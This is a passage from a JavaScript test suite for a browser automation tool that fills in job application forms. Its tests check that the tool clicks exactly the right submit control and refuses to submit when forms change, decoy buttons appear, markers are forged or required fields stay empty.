  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.finalSubmitChooser.outcome, 'selected');
  assert.equal(result.finalSubmitChooser.topScore, 0);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
});

test('v4 invalidates successful controls reparented into another form', async () => {
  const { status, result, clicks: recorded } = await runV4('/reparent-drift', [
    ...minimalV4Fills('#move-email', '#move-resume'),
    { type: 'click', selector: '#mutate' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 invalidates same-node text controls repurposed to another workflow', async () => {
  const { status, result, clicks: recorded } = await runV4('/text-repurpose-drift', [
    { type: 'fill', selector: '#identity-email', value: 'applicant@example.com' },
    { type: 'fill', selector: '#identity-name', value: 'Mehek' },
    { type: 'click', selector: '#mutate' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 revalidates proofs after required-field confirmation mutates a file', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/confirmation-file-drift',
    [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
});

test('v4 reruns the chooser and refuses sibling text drift to a second bare Send', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/confirmation-sibling-drift',
    [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'ambiguous_submit');
});

test('v4 refuses a same-node submitter value change during confirmation', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/confirmation-value-drift',
    [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'form_identity_changed');
});

test('v4 keeps exact proof handles valid when confirmation adds a form validation class', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/confirmation-class-change',
    [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 refuses a late base URL change that alters the resolved form action', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/late-base-href-drift',
    [...minimalV4Fills('#base-email', '#base-resume'), { type: 'click', selector: '#arm-base' }]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'form_identity_changed');
});

test('v4 final chooser globally counts an unrelated form proof reactivated during confirmation', async () => {
  const { status, result, clicks: recorded } = await runV4('/reactivated-unrelated-form', [
    { type: 'fill', selector: '#reactivated-newsletter', value: 'alerts@example.com' },
    ...minimalV4Fills('#reactivated-email', '#reactivated-resume'),
    { type: 'click', selector: '#drift-unrelated' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 2);
});

test('v4 keeps proof handles valid across a same-document history hash update', async () => {
  const { status, result, clicks: recorded } = await runV4('/history-parity', [
    ...workableV4Fills(),
    { type: 'click', selector: '#history' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
});

test('v4 retains shadow-root proofs but fails closed without a supported native submit witness', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/shadow-bare-send',
    minimalV4Fills('#shadow-email', '#shadow-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation, null);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.candidateCount, 0);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
});

test('v4 refuses bare Send when this run also successfully populated an unrelated form', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-unrelated-form', [
    { type: 'fill', selector: '#newsletter-email', value: 'alerts@example.com' },
    ...workableV4Fills()
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 2);
});

test('v4 refuses explicit application submit when every successful action landed in another form', async () => {
  const run = await runV4('/explicit-submit-only-unrelated-proof', [
    { type: 'fill', selector: '#unrelated-email', value: 'applicant@example.com', label: 'email' }
  ]);
  assert.equal(run.status, 0, JSON.stringify(run.error));
  assert.deepEqual(run.requests, []);
  assert.equal(run.result.submitOutcome.pressed, false);
  assert.equal(run.result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(run.result.finalSubmitChooser.addressedScopeCount, 1);
  assert.equal(run.result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 ignores forged successful-address attributes and clicks nothing', async () => {
  const { status, result, clicks: recorded, screenshot } = await runV4('/forged-success-markers');
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(screenshot, true);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 0);
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

test('v4 no-click is terminal before a later generic click', async () => {
  const { status, result, clicks: recorded } = await runV4('/contact-bare-send', [
    { type: 'fill', selector: '#contact-email', value: 'applicant@example.com' },
    { type: 'fill', selector: '#message', value: 'Hello' }
  ], [{ type: 'click', selector: '#send' }]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.match(result.skipped.join('\n'), /skipped after the atomic submit decision became terminal/);
});

test('v4 no-click is terminal before a later Enter press', async () => {
  const { status, result, clicks: recorded } = await runV4('/contact-bare-send', [
    { type: 'fill', selector: '#contact-email', value: 'applicant@example.com' },
    { type: 'fill', selector: '#message', value: 'Hello' }
  ], [{ type: 'press', selector: '#contact-email', value: 'Enter' }]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.match(result.skipped.join('\n'), /skipped after the atomic submit decision became terminal/);
});

for (const drift of [
  ['hidden', '/confirmation-hidden-drift'],
  ['external hidden', '/confirmation-external-hidden-drift'],
  ['optional consent', '/confirmation-consent-drift']
]) {
  test('v4 binds ' + drift[0] + ' submitted state through confirmation', async () => {
    const { status, result, clicks: recorded } = await runV4(
      drift[1],
      [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
    );
    assert.equal(status, 0);
    assert.deepEqual(recorded, []);
    assert.equal(result.submitOutcome.pressed, false);
    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'form_identity_changed');
  });
}

test('v4 returned fingerprints do not expose deterministic submitted values', async () => {
  const first = await runV4(
    '/confirmation-hidden-drift',
    [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
  );
  const second = await runV4(
    '/confirmation-hidden-drift',
    [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
  );
  assert.equal(first.status, 0);
  assert.equal(second.status, 0);
  const serialized = JSON.stringify(first.result);
  const deterministicSecretHash = crypto.createHash('sha256').update('csrf-low-entropy-secret').digest('hex');
  assert.doesNotMatch(serialized, /csrf-low-entropy-secret/);
  assert.equal(serialized.includes(deterministicSecretHash), false);
  assert.notEqual(
    first.result.requiredFieldConfirmation.passes[0].scope.formFingerprint,
    second.result.requiredFieldConfirmation.passes[0].scope.formFingerprint
  );
});

test('v4 blocks an isolated activation inventory that exceeds 512 controls', async () => {
  const { status, result, clicks: recorded, requests } = await runV4(
    '/over-bound-submitted-state', minimalV4Fills('#bound-email', '#bound-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
  assert.equal(result.requiredFieldConfirmation, null);
});

test('v4 requires two distinct successful controls, not two uploads to one resume', async () => {
  const upload = {
    type: 'upload', selector: '#drift-resume',
    file: { name: 'resume.pdf', mimeType: 'application/pdf', base64: Buffer.from('resume').toString('base64') }
  };
  const { status, result, clicks: recorded } = await runV4('/minimal-file-drift', [upload, upload]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
});

test('v4 proof-authorized bare Send cannot be outranked by an external Submit form', async () => {
  const { status, result, clicks: recorded } = await runV4('/workable-external-submit', workableV4Fills());
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.topScore, 0);
});

test('v4 disabled proof-authorized Send prevents an enabled external Submit from winning', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/workable-disabled-external-submit', workableV4Fills()
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
});

test('v4 native explicit submit uses its associated form and cannot submit a decoy', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/workable-explicit-associated-decoy', workableV4Fills()
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(recorded.includes('explicit-associated-decoy'), false);
});

test('v4 refuses a submit-capable selected custom choice during confirmation', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/custom-submit-choice', minimalV4Fills('#custom-email', '#custom-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
});

for (const variant of ['bare', 'explicit']) {
  test('v4 direct handles refuse late ' + variant + ' submitter reparenting', async () => {
    const { status, result, clicks: recorded, requests } = await runV4(
      '/late-' + variant + '-reparent', minimalV4Fills('#late-email', '#late-resume')
    );
    assert.equal(status, 0);
    assert.deepEqual(recorded, []);
    assert.deepEqual(requests, []);
    assert.equal(result.submitOutcome.pressed, false);
    assert.ok(result.requiredFieldConfirmation, JSON.stringify(result));
    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_node_replaced');
    assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  });
}

test('v4 fails closed when a genuinely formless application has no caller-bound form', async () => {
  const { status, result, clicks: recorded, requests } = await runV4('/ashby');
  assert.equal(status, 1);
  assert.equal(result, null);
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
});

test('v4 preserves explicit native submitter override semantics', async () => {
  const { status, result, clicks: recorded, requests } = await runV4(
    '/workable-explicit-override', workableV4Fills()
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.deepEqual(requests, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_event_canceled');
  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
  assert.equal(result.finalSubmitChooser.topScore, 3);
});

test('v4 publishes no candidate or scope marker authority for an observer to redirect', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/direct-marker-redirect',
    minimalV4Fills('#direct-email', '#direct-resume'),
    [
      { type: 'extract', selector: '#send', attribute: 'data-litos-submit-candidate-v2' },
      { type: 'extract', selector: '#application_form', attribute: 'data-litos-submit-scope-v2' },
      { type: 'extract', selector: '#decoy-submit', attribute: 'data-litos-submit-candidate-v2' },
      { type: 'extract', selector: '#decoy-form', attribute: 'data-litos-submit-scope-v2' }
    ]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  for (const selector of ['#send', '#application_form', '#decoy-submit', '#decoy-form']) {
    assert.equal(valueOf(result, selector), null);
  }
});

test('v3 chooser markers remain mirrors and cannot redirect the selected submitter or scope', async () => {
  const { status, result, clicks: recorded } = await run('/direct-marker-redirect');
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['direct-real']);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 accepts successful controls externally associated with the application form', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/external-associated-bare-send',
    minimalV4Fills('#external-email', '#external-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assertScriptInterceptedNativeTransport(result);
  assert.equal(result.finalSubmitChooser.topScore, 0);
  assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
});

for (const semantics of ['base', 'method']) {
  test('v4 blocks pre-chooser form ' + semantics + ' drift at the native binding boundary', async () => {
    const { status, result, clicks: recorded } = await runV4(
      '/pre-chooser-' + semantics + '-drift',
      [
        ...minimalV4Fills('#proof-email', '#proof-resume'),
        { type: 'click', selector: '#mutate-proof' }
      ]
    );
    assert.equal(status, 0);
    assert.deepEqual(recorded, []);
    assertScriptInterceptedNativeTransport(result);
    assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  });
}

test('v4 does not re-resolve a transferred addressed selector into a decoy form', async () => {
  const { status, result, clicks: recorded } = await runV4('/selector-id-transfer', [
    { type: 'fill', selector: '#transfer-email', value: 'applicant@example.com', label: 'email' },
    { type: 'click', selector: '#transfer-id' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
});

for (const variant of ['strip', 'replace']) {
  test('v4 runner-owned failed choice remains a blocker after DOM ' + variant, async () => {
    const { status, result, clicks: recorded } = await runV4(
      '/failed-choice-' + variant,
      [
        ...minimalV4Fills('#failed-email', '#failed-resume'),
        {
          type: 'fillByLabelText',
          text: 'Work authorization',
          value: 'Yes',
          label: 'work_authorization',
          optional: true
        },
        ...(variant === 'replace' ? [{ type: 'click', selector: '#replace-failed' }] : [])
      ],
      [{ type: 'extract', selector: '#authorization-question', attribute: 'data-litos-unverified-choice' }]
    );
    assert.equal(status, 0);
    assert.deepEqual(recorded, []);
    assert.equal(result.submitOutcome.pressed, false);
    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
    assert.match(result.requiredFieldConfirmation.passes[0].unresolved.join('\n'), /choice this run could not/);
    assert.equal(valueOf(result, '#authorization-question'), null);
  });
}

test('v3 private failed-choice authority survives removal of its legacy marker mirror', async () => {
  const { status, result, clicks: recorded } = await run(
    '/failed-choice-strip-v3',
    [],
    [
      ...minimalV4Fills('#failed-email', '#failed-resume'),
      {
        type: 'fillByLabelText',
        text: 'Work authorization',
        value: 'Yes',
        label: 'work_authorization',
        optional: true
      }
    ]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.match(result.requiredFieldConfirmation.passes[0].unresolved.join('\n'), /choice this run could not/);
});

test('v3 ignores a detached failed choice that belonged to an unrelated form', async () => {
  const { status, result, clicks: recorded } = await run(
    '/v3-detached-unrelated-failed-choice',
    [],
    [
      ...minimalV4Fills('#v3-cross-email', '#v3-cross-resume'),
      {
        type: 'fillByLabelText',
        text: 'Secondary preference',
        value: 'Yes',
        label: 'secondary_preference',
        optional: true
      },
      { type: 'click', selector: '#remove-secondary' }
    ]
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['v3-application']);
  assert.equal(result.submitOutcome.pressed, true);
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
});

test('v4 keeps a detached whole-form failed choice as a terminal no-submit refusal', async () => {
  const { status, result, clicks: recorded } = await runV4('/whole-form-failed-choice', [
    {
      type: 'fillByLabelText',
      text: 'Work authorization',
      value: 'Yes',
      label: 'work_authorization',
      optional: true
    },
    { type: 'click', selector: '#replace-whole-form' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation, null);
  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
  assert.equal(result.finalSubmitChooser.candidateCount, 0);
  assert.match(result.skipped.join('\n'), /choice value did not persist/);
});

test('v4 blocks an empty required control externally associated with the form', async () => {
  const { status, result, clicks: recorded } = await runV4(
    '/external-required-control',
    minimalV4Fills('#external-required-email', '#external-required-resume')
  );
  assert.equal(status, 0);
  assert.deepEqual(recorded, []);
  assert.equal(result.submitOutcome.pressed, false);
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.match(
    result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
    /Employer question/
  );
});

const resumeUpload = (selector) => ({
  type: 'upload',
  selector,
  label: 'resume',
  file: {
    name: 'resume.pdf',
    mimeType: 'application/pdf',
    base64: Buffer.from('resume').toString('base64')
  }
});

for (const targetSwap of [
  {
    kind: 'fill',
    fixture: '/fill-target-swap',
    actions: [
      resumeUpload('#stable-resume'),
      { type: 'fill', selector: '#swap-target', value: 'Mehek', label: 'name', optional: true }
    ]
  },
  {
    kind: 'fillByLabelText',
    fixture: '/fill-by-target-swap',
    actions: [
      resumeUpload('#stable-resume'),
      { type: 'fillByLabelText', text: 'Applicant value', value: 'Mehek', label: 'name', optional: true }
    ]
  },
  {
    kind: 'select',
    fixture: '/select-target-swap',
    actions: [
      resumeUpload('#stable-resume'),
      { type: 'select', selector: '#swap-target', value: 'yes', label: 'answer', optional: true }
    ]
  },
  {
    kind: 'upload',
    fixture: '/upload-target-swap',
    actions: [
      { type: 'fill', selector: '#stable-email', value: 'applicant@example.com', label: 'email' },
      { ...resumeUpload('#swap-target'), optional: true }
    ]
  }
]) {
  test('v4 pins the exact ' + targetSwap.kind + ' target through mutation and readback', async () => {
    const { status, result, clicks: recorded } = await runV4(targetSwap.fixture, targetSwap.actions);
    assert.equal(status, 0);
    assert.deepEqual(recorded, []);
    assert.equal(result.submitOutcome.pressed, false);
    assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
    assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
  });
}

test('a formless Ashby application binds the field container and submits exactly once', async () => {
  const { status, result, clicks: recorded } = await run('/ashby', [
    { type: 'extract', selector: '#form', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#root', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '.ashby-job-posting-right-pane', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: 'button._active_1svni_57' },
    { type: 'extract', selector: 'input[name="4c3852e7-e63c-44dc-956b-a819f456e945"]', attribute: 'checked' }
  ]);
  assert.equal(status, 0, 'the run must not abort on a page with no form element');
  assert.deepEqual(recorded, ['ashby'], 'the submit control is pressed exactly once');
  assert.equal(valueOf(result, '#submitted'), 'ashby');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.submitOutcome.pressed, true);
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.submissionOutcome, 'clicked');
  assert.equal(pass.scope.scopeKind, 'container');
  assert.equal(pass.scope.sameNode, true);
  assert.deepEqual(pass.unresolved, []);
  const priorGovernment = pass.attempts.find((attempt) => attempt.label === 'Prior US Government Employment?');
  assert.equal(priorGovernment?.fieldType, 'checkbox');
  assert.equal(priorGovernment?.outcome, 'already_committed');
  assert.equal(valueOf(result, 'button._active_1svni_57'), 'No');
  assert.equal(valueOf(result, 'input[name="4c3852e7-e63c-44dc-956b-a819f456e945"]'), null,
    'confirming No must not flip Ashby\'s unchecked boolean backing input to Yes');
  // The nearest ancestor holding field controls is div#form, not the pane above it and not the root.
  // Ashby's answer pills are buttons too, so the final candidate's DOM index is intentionally opaque.
  assert.match(valueOf(result, '#form') || '', /^\d+$/);
  assert.equal(valueOf(result, '.ashby-job-posting-right-pane'), null);
  assert.equal(valueOf(result, '#root'), null);
});

test('an unanswered Ashby yes/no still blocks the atomic submit', async () => {
  const { status, result, clicks: recorded } = await run('/ashby?leave-government-unanswered');
  assert.equal(status, 0, 'a truthful atomic refusal is a completed managed run');
  assert.deepEqual(recorded, [], 'no submit control is pressed while the required pill has no selection');
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.submitOutcome.pressed, false);
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.submissionOutcome, 'blocked');
  assert.ok(pass.unresolved.includes('Prior US Government Employment?'));
  const priorGovernment = pass.attempts.find((attempt) => attempt.label === 'Prior US Government Employment?');
  assert.equal(priorGovernment?.fieldType, 'checkbox');
  assert.equal(priorGovernment?.outcome, 'failed');
});

test('a non-Ashby radio group keeps its checked peer despite an unrelated button', async () => {
  const { status, result, clicks: recorded } = await run('/ashby?non-ashby-radio-peer');
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['ashby'], 'an ordinary button must not short-circuit checked radio peers');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].unresolved.length, 0);
});

test('a hidden active sibling cannot answer an ordinary unchecked fieldset checkbox', async () => {
  const { status, result, clicks: recorded } = await run('/ashby?fieldset-sibling-checkbox');
  assert.equal(status, 0);
  assert.deepEqual(recorded, [], 'selected-looking sibling furniture must not authorize submit');
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.submitOutcome.pressed, false);
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.ok(pass.unresolved.includes('I consent'));
  const consent = pass.attempts.find((attempt) => attempt.label === 'I consent');
  assert.equal(consent?.fieldType, 'checkbox');
  assert.equal(consent?.outcome, 'failed');
});

test('the Greenhouse shape still binds its real form and ignores the Apply button outside it', async () => {
  const { status, result, clicks: recorded } = await run('/greenhouse', [
    { type: 'extract', selector: '#application', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#page', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['greenhouse'], 'the in-form submit is pressed, and the decoy never is');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.scope.scopeKind, 'form', 'a form ancestor still wins outright');
  assert.equal(pass.submissionOutcome, 'clicked');
  assert.equal(valueOf(result, '#application'), '1', 'candidate 1 is the in-form submit');
  // The decoy resolves no scope at all on a page that has a viable in-form candidate, so nothing
  // above the form is ever a submission scope.
  assert.equal(valueOf(result, '#page'), null);
});

test('German Recruitee binds exact Senden only inside the addressed application form', async () => {
  const { status, result, clicks: recorded } = await run('/recruitee-german', [
    { type: 'extract', selector: '#application', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#page', attribute: 'data-litos-submit-scope-v2' }
  ], [
    { type: 'fill', selector: 'input[name="candidate.name"]', value: 'Mehek Mandal', label: 'name' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['recruitee'], 'only the form-bound Senden control is pressed');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.match(valueOf(result, '#application') || '', /^\d+$/);
  assert.equal(valueOf(result, '#page'), null, 'a page-level Senden control has no submission scope');
});

test('a header Apply Now cannot outscore the real in-form Submit', async () => {
  const { status, result, clicks: recorded } = await run('/outscoring-decoy', [
    { type: 'extract', selector: '#application', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#wrapper', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0);
  // "Apply Now" scores 2 and "Submit" scores 1, so score alone would press the wrong control.
  assert.deepEqual(recorded, ['real'], 'the form submit is pressed and the header decoy is not');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  assert.equal(result.requiredFieldConfirmation.passes[0].scope.scopeKind, 'form');
  assert.equal(valueOf(result, '#application'), '1');
  assert.equal(valueOf(result, '#wrapper'), null, 'the wrapper is never a scope while a form is viable');
});

test('a submit whose only container would be body fails closed and clicks nothing', async () => {
  const { status, result, clicks: recorded } = await run('/body-only');
  assert.notEqual(status, 0, 'no scope means no submit, and the run stops');
  assert.equal(result, null, 'a failed pass writes no result packet');
  assert.deepEqual(recorded, [], 'nothing on the page may be pressed');
});

test('two equally scored final controls in one container stay ambiguous and click nothing', async () => {
  const { status, result, clicks: recorded } = await run('/ambiguous');
  assert.notEqual(status, 0, 'an equal top-score tie must fail closed on a formless page too');
  assert.equal(result, null);
  assert.deepEqual(recorded, [], 'neither candidate may be pressed');
});

test('a container smaller than the application refuses rather than clicking past a required field', async () => {
  const { status, result, clicks: recorded } = await run('/nested');
  assert.notEqual(status, 0, 'a required field outside the container is unresolvable, not ignorable');
  assert.equal(result, null);
  assert.deepEqual(recorded, [], 'the empty work authorisation question withholds the click');
});

test('a submit outside the field container binds the wrapper that holds both', async () => {
  const { status, result, clicks: recorded } = await run('/footer-bar', [
    { type: 'extract', selector: '#page', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#footer-bar', attribute: 'data-litos-submit-scope-v2' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['footer'], 'a footer submit over a complete form still sends once');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.scope.scopeKind, 'container');
  assert.equal(pass.scope.requiredControlCount, 2, 'both application fields are in scope');
  assert.equal(valueOf(result, '#page'), '0');
  assert.equal(valueOf(result, '#footer-bar'), null, 'a box with no fields is not a scope');
});

test('required page furniture inside the bound wrapper withholds the click', async () => {
  const { status, result, clicks: recorded } = await run('/footer-bar-furniture');
  assert.equal(status, 0);
  assert.deepEqual(recorded, [], 'an unexplained required field in scope is never clicked past');
  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
  assert.equal(result.submitOutcome.pressed, false);
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.submissionOutcome, 'blocked');
  assert.ok(pass.unresolved.some((entry) => /Job alert email/.test(entry)), 'and it says what stopped it');
});

test('a real form beside a formless application does not veto that application', async () => {
  const { status, result, clicks: recorded } = await run('/sibling-form', [
    { type: 'extract', selector: '#app-form', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#newsletter', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#alerts', attribute: 'value' }
  ]);
  assert.equal(status, 0);
  // The newsletter's email is required and empty, but it belongs to its own form's submission.
  assert.deepEqual(recorded, ['bamboo'], 'the application is sent and the newsletter is never pressed');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.scope.scopeKind, 'container');
  assert.equal(pass.scope.requiredControlCount, 3, 'only the application fields are scanned');
  // The newsletter's button is candidate 0 and says "Submit", so it is a final control by the
  // grammar. What stops it vetoing the container path is that its form is one email field: it
  // collects nothing an application collects, so it is not a submission scope at all.
  assert.equal(valueOf(result, '#newsletter'), null);
  assert.equal(valueOf(result, '#app-form'), '1');
  assert.equal(valueOf(result, '#alerts'), '', 'the newsletter field is untouched');
});

test('a stray newsletter form whose button says Submit never takes the click', async () => {
  const { status, result, clicks: recorded } = await run('/stray-newsletter', [
    { type: 'extract', selector: '#app-form', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#stray', attribute: 'data-litos-submit-scope-v2' },
    { type: 'extract', selector: '#alerts', attribute: 'value' }
  ]);
  assert.equal(status, 0);
  assert.deepEqual(recorded, ['application'], 'the application is pressed and the newsletter is not');
  assert.equal(result.requiredFieldConfirmation.status, 'confirmed');
  const pass = result.requiredFieldConfirmation.passes[0];
  assert.equal(pass.scope.scopeKind, 'container', 'the formless application is still reachable');
  assert.equal(pass.submissionOutcome, 'clicked');
  assert.equal(valueOf(result, '#app-form'), '1', 'candidate 1 is the application submit');
  assert.equal(valueOf(result, '#stray'), null, 'a one field newsletter is not a submission scope');
  assert.equal(valueOf(result, '#alerts'), 'reader@example.com', 'the newsletter is untouched');
});

test('a stray filter form whose button says Apply never takes the click', async () => {
  const { status, result, clicks: recorded } = await run('/stray-filter', [
